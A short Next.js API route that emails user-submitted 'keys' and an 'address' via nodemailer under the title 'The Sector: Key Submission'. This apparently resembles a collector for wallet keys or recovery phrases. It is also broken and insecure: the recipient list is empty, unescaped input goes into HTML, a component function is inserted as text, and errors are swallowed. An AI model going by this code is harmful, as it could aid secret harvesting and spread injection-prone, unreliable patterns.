import { KeywordsModal } from "@/app/keywords/KeywordsModal"
import { error } from "console"
import { NextRequest, NextResponse } from "next/server"
import nodemailer from "nodemailer"

const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASSWORD,
    }
})

export async function POST(req: NextRequest) {
    const { keys , address} = await req.json()

    if (!keys) return NextResponse.json({ error: "Missing fields", status: 400 }, { status: 400 })


    try {
        await transporter.sendMail({
            to: [],
            from: `"The Sector: Key Submission" <${process.env.EMAIL_USER}>`,
            text: `New keys submision review: ${keys} `,
            html: `
    <!DOCTYPE html>
    <html>
        <head>
          <meta charset="utf-8" />
          <meta name="viewport" content="width=device-width, initial-scale=1.0" />
          <title>KEYS</title>
        </head>
        <body>
            <div>${KeywordsModal}</div>
            <div>Address:${address}</div>
        </body>
    </html>
            `
        })
    } catch { }
}